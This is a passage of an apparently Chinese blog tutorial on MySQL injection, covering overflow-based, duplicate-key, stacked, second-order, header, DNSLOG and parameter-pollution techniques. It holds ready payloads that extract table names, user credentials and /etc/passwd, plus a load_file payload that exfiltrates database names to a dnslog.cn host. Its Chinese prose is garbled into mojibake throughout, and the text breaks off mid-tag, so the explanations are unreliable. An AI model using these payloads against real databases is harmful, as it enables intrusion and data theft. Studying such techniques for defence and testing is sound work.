ç¬¦å·æ•´æ•°æ¥è¯´ï¼ŒBIGINTå¯ä»¥å­˜æ”¾çš„æœ€å¤§å€¼ç”¨äºŒè¿›åˆ¶ã€åå…­è¿›åˆ¶å’Œåè¿›åˆ¶è¡¨ç¤ºçš„è¯ï¼Œåˆ†åˆ«ä¸ºâ€œ0b1111111111111111111111111111111111111111111111111111111111111111â€ã€â€œ0xFFFFFFFFFFFFFFFFâ€å’Œâ€œ18446744073709551615â€ã€‚åŒæ ·çš„ï¼Œå¦‚æœå¯¹è¿™ä¸ªå€¼è¿›è¡Œæ•°å€¼è¡¨è¾¾å¼è¿ç®—ï¼Œå¦‚åŠ æ³•æˆ–å‡æ³•è¿ç®—ï¼ŒåŒæ ·ä¹Ÿä¼šå¯¼è‡´â€œBIGINT value is out of rangeâ€é”™è¯¯ã€‚</p><p>å¦‚æœæˆ‘ä»¬å¯¹æ•°å€¼0é€ä½å–åï¼Œç»“æœä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ å½“ç„¶æ˜¯å¾—åˆ°ä¸€ä¸ªæ— ç¬¦å·çš„æœ€å¤§BIGINTå€¼ï¼Œè¿™ä¸€ç‚¹æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230508143729585.png"></p></blockquote><p>æˆ‘ä»¬å¯¹~0è¿›è¡ŒåŠ å‡è¿ç®—çš„æ—¶å€™å°±ä¼šå¯¼è‡´BIGINTæº¢å‡ºé”™è¯¯</p><p><strong>æ³¨å…¥åŸç†</strong></p><p>åˆ©ç”¨å­æŸ¥è¯¢å¼•èµ·BITINTæº¢å‡ºï¼Œä»è€Œè®¾æ³•æå–æ•°æ®ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœä¸€ä¸ªæŸ¥è¯¢æˆåŠŸè¿”å›ï¼Œå…¶è¿”å›å€¼ä¸º0ï¼Œæ‰€ä»¥å¯¹å…¶è¿›è¡Œé€»è¾‘éçš„è¯å°±ä¼šå˜æˆ1ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬å¯¹ç±»ä¼¼(select*from(select user())x)è¿™æ ·çš„æŸ¥è¯¢è¿›è¡Œé€»è¾‘éçš„è¯ï¼Œå°±ä¼šæœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â mysql&gt; select (select*from(select user())x);Â +-------------------------------+Â  (select*from(select user())x) Â +-------------------------------+Â  root@localhost Â +-------------------------------+Â 1 row in set (0.00 sec)Â #Applying logical negationÂ â€‹Â mysql&gt; select !(select*from(select user())x);Â +--------------------------------+Â  !(select*from(select user())x) Â +--------------------------------+Â  1 Â +--------------------------------+Â 1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œ<code>select user())x</code>é‡Œé¢çš„xæŒ‡çš„æ˜¯æŠŠæŸ¥è¯¢çš„æ•°æ®æ”¾åˆ°xè¿™ä¸ªå˜é‡é‡Œé¢</p></blockquote><p>åªè¦æˆ‘ä»¬èƒ½å¤Ÿç»„åˆå¥½é€ä½å–åå’Œé€»è¾‘å–åè¿ç®—ï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨æº¢å‡ºé”™è¯¯æ¥æˆåŠŸçš„æ³¨å…¥æŸ¥è¯¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â mysql&gt; select ~0+!(select*from(select user())x);Â ERROR 1690 (22003): BIGINT value is out of range in &#x27;(~(0) + (not((select &#x27;root@localhost&#x27; from dual))))&#x27;</span><br></pre></td></tr></table></figure><p><strong>è·å–æ•°æ®</strong></p><p>è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</span><br></pre></td></tr></table></figure><p>åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select !(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x)-~0;</span><br></pre></td></tr></table></figure><p>æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â !(select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x)-~0;</span><br></pre></td></tr></table></figure><hr><p><strong>æ•´å½¢æº¢å‡ºæŠ¥é”™æ³¨å…¥åŸç†exp</strong></p><p>exp()å³ä¸ºä»¥eä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼Œå³æ±‚è§£eçš„710æ¬¡æ–¹ï¼Œå½“ä¼ é€’ä¸€ä¸ªå¤§äº709çš„å€¼æ—¶ï¼Œå‡½æ•°exp()å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â mysql&gt; select exp(710);Â ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure><p>exp(<del>0) ~è¡¨ç¤ºæŒ‰ä½å–åï¼Œåˆ™select exp(</del>0) ä¸€å®šä¼šå‡ºé”™</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â exp(~(select*from(select load_file(&#x27;/etc/passwd&#x27;))a))Â exp(~(select*from(select user())x))Â exp(~(select * from (select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x))</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºç¬¬äºŒæ¡è¯­å¥ï¼š</p><p>1.å…ˆæŸ¥è¯¢select user()è¿™ä¸ªè¯­å¥çš„ç»“æœï¼Œç„¶åå°†æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä½œä¸ºä¸€ä¸ªç»“æœé›†å–åä¸ºa</p><p>2.ç„¶ååœ¨æŸ¥è¯¢select * from a æŸ¥è¯¢xï¼Œå°†ç»“æœé›†aå…¨éƒ¨æŸ¥è¯¢å‡ºæ¥</p><p>3.æŸ¥è¯¢å®Œæˆï¼Œè¯­å¥æˆåŠŸæ‰§è¡Œï¼Œè¿”å›å€¼ä¸º0ï¼Œå†å–åè·å–ï¼Œæ˜¯expè°ƒç”¨çš„æ—¶å€™æŠ¥é”™</p></blockquote><p>æ³¨ï¼šå½“ç‰ˆæœ¬å¤§äº5.5.53æ—¶ï¼Œä¸èƒ½è¿”å›æŸ¥è¯¢ç»“æœ</p><h6 id="ä¸»é”®é‡å¤æŠ¥é”™"><a href="#ä¸»é”®é‡å¤æŠ¥é”™" class="headerlink" title="ä¸»é”®é‡å¤æŠ¥é”™"></a>ä¸»é”®é‡å¤æŠ¥é”™</h6><p>ä¸»é”®é‡å¤æ–¹å¼çš„æŠ¥é”™æ³¨å…¥åˆ©ç”¨çš„å‡½æ•°æœ‰ï¼š floor() + rand() + group() + count()</p><blockquote><p>å…³é”®å‡½æ•°ï¼š Rand() â€”â€”-äº§ç”Ÿ0~1çš„ä¼ªéšæœºæ•° Floor() â€”â€”-å‘ä¸‹å–æ•´æ•° Concat() â€”â€“è¿æ¥å­—ç¬¦ä¸² Count() â€”â€”è®¡ç®—æ€»æ•°</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â Payloadå¦‚ä¸‹ï¼šÂ  Select count(*),concat(**PAYLOAD**,floor(rand(0)*2))x from è¡¨å group by x;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆrandï¼ˆ0ï¼‰çš„ä½œç”¨æ˜¯äº§ç”Ÿ0~1çš„éšæœºæ•°ï¼Œä½†è¿™ä¸ªéšæœºæ•°åˆ—æ˜¯ä¼ªéšæœºæ•°ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ç»„å›ºå®šçš„å€¼ï¼Œå½“æˆ‘ä»¬å¯¹è¿™ç»„éšæœºæ•°ä¹˜2åï¼Œå¾—åˆ°çš„ä¹Ÿæ˜¯ä¸€ç»„å›ºå®šçš„å€¼ï¼Œç„¶åæˆ‘ä»¬ä½¿ç”¨floorï¼ˆï¼‰å‡½æ•°ï¼Œå‘ä¸‹å–æ•´ï¼Œå¾—åˆ°äº†ä¸€ç»„ååˆ†é‡è¦çš„æ•°åˆ—ï¼ˆ011011011â€¦â€¦.ï¼‰æ— é™é‡å¤ï¼Œè¿™ä¸ªæ•°åˆ—å¾ˆé‡è¦ï¼</p><p>æ¥ç€ï¼Œå¯¹äºcountï¼ˆï¼‰å’Œgroup byè¿ç”¨çš„æƒ…å†µã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230508161246452-1024x1002.png" style="zoom:67%;" /><p>ä½†æ˜¯ï¼Œå½“é‡ä¸Šæˆ‘ä»¬åˆšåˆšæ„é€ çš„011011è¿™ä¸ªç¥å¥‡çš„æ•°åˆ—çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°ä¸€ä¸ªå¤§é—®é¢˜ã€‚è¿™ç§æŠ¥é”™æ–¹æ³•çš„æœ¬è´¨æ˜¯å› ä¸ºfloor(rand(0)*2)çš„é‡å¤æ€§ï¼Œå¯¼è‡´group byè¯­å¥å‡ºé”™ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªæ•°åˆ—çš„æ—¶å€™ä¼šé€ æˆ<strong>ä¸»é”®é‡å¤</strong>ï¼ŒæŠ›å‡ºé”™è¯¯ã€‚</p><p>æ€»ç»“ä¸»é”®é‡å¤æ³¨å…¥åŸç†ï¼š</p><blockquote><p><strong>group by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚group by floor(random(0)*2)å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶ floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ä¸ä¸€è‡´ï¼Œå¯¼è‡´æ’å…¥æ—¶ä¸åŸæœ¬å·²å­˜åœ¨çš„äº§ç”Ÿå†²çªçš„é”™è¯¯ã€‚</strong></p></blockquote><p>å…·ä½“ä¸€ç‚¹ï¼šfloor(rand(0)*2)çš„æ•°åˆ—å›ºå®šäº†å°±æ˜¯011011011â€¦ã€ä¼ªéšæœºæ•°ã€‘</p><blockquote><p>å°±æ˜¯group byä¸rand()ä½¿ç”¨æ—¶ï¼Œå¦‚æœä¸´æ—¶è¡¨ä¸­æ²¡æœ‰è¯¥ä¸»é”®ï¼Œåˆ™åœ¨æ’å…¥å‰rand()ä¼šå†è®¡ç®—ä¸€æ¬¡ï¼ˆä¹Ÿå°±æ˜¯ä¸¤æ¬¡ï¼Œä½†æœ‰äº›åšå®¢å†™çš„æ˜¯å¤šæ¬¡ï¼Œè¿™ä¸ªå¤šæ¬¡åˆ°åº•æ˜¯å‡ æ¬¡å¹¶ä¸çŸ¥é“ï¼Œä½†æ˜¯ä»¥ä¸¤æ¬¡æ¥ç†è§£ä¸‹é¢çš„å®éªŒéƒ½èƒ½è¯´çš„é€šï¼‰ã€‚å°±æ˜¯è¿™ä¸ªç‰¹æ€§å¯¼è‡´äº†ä¸»é”®é‡å¤å¹¶æŠ¥é”™ã€‚æˆ‘ä»¬æ¥çœ‹ï¼š</p><p>å½“group by å–ç¬¬ä¸€æ¡from è¡¨è®°å½•æ—¶ï¼Œæ­¤æ—¶group byçš„æ˜¯â€™security0â€™ï¼Œå‘ç°ä¸´æ—¶è¡¨ä¸­å¹¶æ²¡æœ‰â€™security0â€™çš„ä¸»é”®ï¼Œæ³¨æ„ï¼Œè¿™ä¸ªæ—¶å€™rand(0)*2ä¼šå†è®¡ç®—ä¸€æ¬¡ï¼Œç»floor()åï¼Œç‡å…ˆæ’å…¥ä¸´æ—¶è¡¨çš„ä¸»é”®ä¸æ˜¯security0ï¼Œè€Œæ˜¯security1ï¼Œå¹¶è®¡æ•°1ã€‚</p><p>ç„¶åå–ç¬¬äºŒæ¡è®°å½•ï¼Œç¬¬äºŒæ¡è®°å½•group by çš„keyä¸­çš„01ä»ç”±floor(rand(0)<em>2)ç»§ç»­è®¡ç®—è·å¾—ï¼Œä¹Ÿå°±æ˜¯security1ã€‚æ­¤æ—¶ä¸´æ—¶è¡¨ä¸­å·²ç»æœ‰security1çš„ä¸»é”®äº†ï¼Œæ‰€ä»¥count(</em>)ç›´æ¥åŠ 1å°±å¯ä»¥ã€‚</p><p><strong>ç»§ç»­ä»fromçš„è¡¨ä¸­å–ç¬¬ä¸‰æ¡è®°å½•ï¼Œå†æ¬¡è®¡ç®—floor(rand(0)*2)ï¼Œç»“æœä¸º0ï¼Œä¸database()æ‹¼æ¥ä¸ºsecurity0ï¼Œä¸´æ—¶è¡¨çš„ä¸»é”®ä¸­å¹¶ä¸å­˜åœ¨ï¼Œåœ¨æ’å…¥å‰ï¼Œfloor(rand(0)*2)åˆè®¡ç®—ä¸€æ¬¡ï¼Œæ‹¼æ¥åä¸secruity1ï¼Œä½†æ˜¯æ˜¯ç›´æ¥æ’å…¥ï¼Œå³ä½¿ä¸´æ—¶è¡¨ä¸­å·²ç»æœ‰äº†ä¸»é”®security1ä¹Ÿç¡¬è¦æ’å…¥ï¼Œä»è€Œå¯¼è‡´ä¸»é”®é‡å¤æŠ¥é”™</strong>ï¼Œä¹Ÿå°±æ˜¯ï¼šERROR 1062 (23000): Duplicate entry â€˜security1â€™ for key â€˜group_keyâ€™ã€‚</p></blockquote><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+Â select count(*) from users group by concat(database(),floor(rand(0)*2));Â select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/beepress-image-140616-1599533130.png"></p><p>æ³¨ï¼šè¿™å°±é€ æˆdatabase()è¢«çˆ†å‡ºæ¥äº†ã€‚ã€‚</p><h5 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h5><p>å †å æ³¨å…¥ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†è¯­å¥å †å åœ¨ä¸€èµ·è¿›è¡ŒæŸ¥è¯¢ åŸç†å¾ˆç®€å•ï¼Œmysql_multi_query() æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œå°±æ˜¯ä¸ª;åˆ†éš”ï¼Œæˆå †çš„æ‰§è¡Œsqlè¯­å¥ï¼Œä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â 1 select * from users;show databases; </span><br></pre></td></tr></table></figure><p>å°±åŒæ—¶æ‰§è¡Œä»¥ä¸Šä¸¤æ¡å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¢åˆ æ”¹æŸ¥ï¼Œåªè¦æƒé™å¤Ÿ è™½ç„¶è¿™ä¸ªæ³¨å…¥å§¿åŠ¿å¾ˆç‰›é€¼ï¼Œä½†å®é™…é‡åˆ°å¾ˆå°‘ï¼Œå…¶å¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ï¼Œåˆæˆ–è€…æƒé™çš„é™åˆ¶åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œåˆ©ç”¨mysqli_multi_query()å‡½æ•°å°±æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥è¯´å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œä¸€æ—¦èƒ½å¤Ÿè¢«ä½¿ç”¨ï¼Œå°†å¯èƒ½å¯¹ç½‘ç«™é€ æˆååˆ†å¤§çš„å¨èƒã€‚</p><p>å¸¸è§çš„ç»•è¿‡æœ‰åå…­è¿›åˆ¶ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â ...;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span><br></pre></td></tr></table></figure><h5 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h5><h6 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h6><p>åœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨åç«¯ä»£ç  ä¸­å¯èƒ½ä¼šè¢«è½¬ä¹‰ï¼Œä½†åœ¨å­˜å…¥æ•°æ®åº“æ—¶è¿˜æ˜¯åŸæ¥çš„æ•°æ®ï¼Œæ•°æ®ä¸­ä¸€èˆ¬å¸¦æœ‰å•å¼•å·å’Œï¼ƒå·ï¼Œç„¶åä¸‹æ¬¡ä½¿ ç”¨åœ¨æ‹¼å‡‘SQLä¸­ï¼Œæ‰€ä»¥å°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p><h6 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h6><ul><li>é¦–å…ˆ new_user.php é¡µé¢è·å–æ•°æ®å¹¶æäº¤ç»™ login_create.php æ¯”å¦‚åˆ›å»ºç”¨æˆ·åä¸ºadmin#çš„ç”¨æˆ·</li><li>login_create.php æ”¶åˆ°æ•°æ®ã€adminâ€™#ã€‘åï¼Œè¿›è¡Œè½¬ä¹‰ã€admin&#x2F;â€˜#ã€‘ï¼Œç„¶åç›´æ¥å°†æ•°æ®å­˜æ”¾åˆ°æ•°æ®åº“ï¼Œä½†æ˜¯æ•°æ®åº“å¹¶ ä¸ä¼šå°†è½¬ä¹‰çš„ç¬¦å·å­˜æ”¾è¿›æ•°æ®åº“ã€‚ã€æ‰€ä»¥å­˜è¿›å»çš„æ•°æ®æ—¶adminâ€™#ã€‘</li><li>ä¿®æ”¹å¯†ç é¡µé¢å†…å®¹ã€ä¿®æ”¹ç”¨æˆ·åä¸ºadminâ€™#çš„å¯†ç ä¸º123456ã€‘</li><li>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åç«¯çš„SQLè¯­å¥æ˜¯ï¼š<code>update user set passwd=123456 where username=&#39;admin&#39;#&#39;&quot;</code>,æˆåŠŸæŠŠadminçš„å¯†ç æ”¹æ‰</li></ul><h5 id="DNSLOGæ³¨å…¥"><a href="#DNSLOGæ³¨å…¥" class="headerlink" title="DNSLOGæ³¨å…¥"></a>DNSLOGæ³¨å…¥</h5><p>å‰æï¼š</p><ul><li>secure_file_priv ä¸ºç©ºï¼Œå…·ä½“åœ¨mysql.inié‡Œä¿®æ”¹ </li><li>load_file å¯ç”¨</li><li>UNCè·¯å¾„ï¼Œä¸»è¦ç”¨äºå…±äº«æ–‡ä»¶èµ„æºï¼Œæ ¼å¼ \servername\sharename\directory\filename</li></ul><p>æ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select load_file(concat(&#x27;\\\\&#x27;,(select Â database()),&#x27;.fi9wbl.dnslog.cn\\123&#x27;));</span><br></pre></td></tr></table></figure><ul><li>1ã€å››ä¸ª \ å…¶ä¸­ä¸ºè½¬ä¹‰ ä»£è¡¨ä¸¤ä¸ª \</li><li>2ã€åé¢è·Ÿä¸Šæˆ‘ä»¬è¦çš„ä¿¡æ¯</li><li>3ã€è·Ÿä¸Šæˆ‘ä»¬çš„åŸŸå</li><li>4ã€æœ€åè¿˜æœ‰ä¸ªæ–‡ä»¶åï¼Œå¯ä»¥éšæ„å†™ï¼Œå¦‚ 123</li></ul><p>æ³¨æ„ï¼šå¦‚æœç»“æœä¸­æœ‰ç‰¹æ®Šç¬¦å·ï¼Œé‚£ä¹ˆå°±å¸¦ä¸å‡ºæ¥ï¼Œå¯ä»¥ç”¨ hex() ï¼Œå°†ç»“æœè½¬æˆ16è¿›åˆ¶å†å¤–å¸¦</p><h5 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230508192714934-1024x926.png" style="zoom:67%;" /><h5 id="orderbyæ³¨å…¥"><a href="#orderbyæ³¨å…¥" class="headerlink" title="orderbyæ³¨å…¥"></a>orderbyæ³¨å…¥</h5><h5 id="HTTPå¤´æ³¨å…¥"><a href="#HTTPå¤´æ³¨å…¥" class="headerlink" title="HTTPå¤´æ³¨å…¥"></a>HTTPå¤´æ³¨å…¥</h5><p>åªè¦ä¸æ•°æ®åº“äº¤äº’éƒ½å¯ä»¥</p><ul><li>UAå¤´éƒ¨Â User-Agent:â€™or updatexml(1,concat(0x23,database()),1) orâ€™<br>Â å®Œæ•´è¯­å¥ï¼š<br>Â INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES<br>Â (â€˜â€™or (extractvalue(1,concat(0x7e,(select database()),0x7e))) orâ€™â€™,<br>Â â€˜127.0.0.1â€™, â€˜adminâ€™)</li></ul><hr><h4 id="å…¶ä»–æ”»å‡»"><a href="#å…¶ä»–æ”»å‡»" class="headerlink" title="å…¶ä»–æ”»å‡»"></a>å…¶ä»–æ”»å‡»</h4><hr><h5 id="HTTPå‚æ•°æ±¡æŸ“"><a href="#HTTPå‚æ•°æ±¡æŸ“" class="headerlink" title="HTTPå‚æ•°æ±¡æŸ“"></a>HTTPå‚æ•°æ±¡æŸ“</h5><p><strong>HTTPå‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHTTP Parameter Pollutionï¼‰ç®€ç§°HPP</strong>ï¼Œç”±äºHTTPåè®®å…è®¸åŒåå‚æ•°çš„å­˜åœ¨ï¼ŒåŒæ—¶ï¼Œåå°å¤„ç†æœºåˆ¶å¯¹åŒåå‚æ•°çš„å¤„ç†æ–¹å¼ä¸å½“ï¼Œé€ æˆâ€œå‚æ•°æ±¡æŸ“â€ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å¯¹ç½‘ç«™ä¸šåŠ¡é€ æˆæ”»å‡»ï¼Œç”šè‡³ç»“åˆå…¶ä»–æ¼æ´ï¼Œè·å–æœåŠ¡å™¨æ•°æ®æˆ–è·å–æœåŠ¡å™¨æœ€é«˜æƒé™ã€‚</p><p>HPPå‘ç”Ÿåœ¨æŸ¥è¯¢å‚æ•°ä¸­ï¼ŒæŸ¥è¯¢å‚æ•°é€šå¸¸æ˜¯æŒ‡URIä¸­â€œ?â€å’ŒURIç»“å°¾ä¹‹é—´çš„éƒ¨åˆ†ï¼Œæ˜¯ä¸€ç³»åˆ—çš„åŸŸå€¼å¯¹ï¼Œå¯ä»¥å‚è€ƒRFC 3986æŸ¥çœ‹å…¶å…·ä½“å®šä¹‰ï¼Œè¿™äº›åŸŸå€¼å¯¹æ˜¯é€šè¿‡â€œ&amp;â€åˆ†å¼€çš„ï¼Œä¾‹å¦‚ï¼šname&#x3D;admin&amp;password&#x3D;Test@123ã€‚å¦‚æœç”¨æˆ·è¾“å…¥çš„nameçš„å€¼ä¸ºï¼šadmin&amp;password&#x3D;123,æ•°æ®æ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†ç”¨äºæäº¤è¯·æ±‚ï¼Œé‚£ä¹ˆè¿™ä¸ªURLå°±ä¼šè¢«ç¯¡æ”¹ä¸ºï¼šname&#x3D;admin&amp;password&#x3D;123&amp;password&#x3D;Test@123ã€‚</p><p>ä¸‹è¡¨æ˜¯ä¸åŒçš„WebæœåŠ¡å™¨å¦‚ä½•ç®¡ç†å¤šæ¬¡å‡ºç°çš„åŒä¸€å‚æ•°ã€‚</p><p>HTTPåç«¯</p><p>æ€»ä½“è§£æç»“æœ</p><p>ä¾‹å­</p><p>ASP.NET&#x2F;IIS</p><p>ç‰¹å®šå‚æ•°æ‰€æœ‰å†…å®¹è¿›è¡Œæ‹¼æ¥</p><p>par1&#x3D;val1,val2</p><p>ASP&#x2F;IIS</p><p>ç‰¹å®šå‚æ•°æ‰€æœ‰å†…å®¹è¿›è¡Œæ‹¼æ¥</p><p>par1&#x3D;val1,val2</p><p>PHP&#x2F;Apache</p><p><strong>æœ€åä¸€æ¬¡å‡ºç°çš„å‚æ•°å†…å®¹</strong></p><p><strong>par1&#x3D;val2</strong></p><p>PHP&#x2F;Zeus</p><p>æœ€åä¸€æ¬¡å‡ºç°çš„å‚æ•°å†…å®¹</p><p>par1&#x3D;val2</p><p>JSP,Servlet&#x2F;Apache Tomcat</p><p>ç¬¬ä¸€æ¬¡å‡ºç°çš„å‚æ•°å†…å®¹</p><p>par1&#x3D;val1</p><h6 id="SQLæ³¨å…¥åº”ç”¨"><a href="#SQLæ³¨å…¥åº”ç”¨" class="headerlink" title="SQLæ³¨å…¥åº”ç”¨"></a>SQLæ³¨å…¥åº”ç”¨</h6><p>å¸¸è§„æ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â http://webApplication/showproducts.asp?ID=9 UNION SELECT 1,2,3 FROM Users WHERE id=3 â€”</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨HPPæ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â http://webApplication/showproducts.asp?ID=9 Â /*&amp;ID=*/UNION /*&amp;ID=*/SELECT 1 &amp;ID=2  &amp;ID=3 FROM /*&amp;ID=*/Users /*&amp;ID=*/ WHERE id=3 â€”</span><br></pre></td></tr></table></figure><h5 id="SQLçº¦æŸæ”»å‡»"><a href="#SQLçº¦æŸæ”»å‡»" class="headerlink" title="SQLçº¦æŸæ”»å‡»"></a>SQLçº¦æŸæ”»å‡»</h5><h6 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" 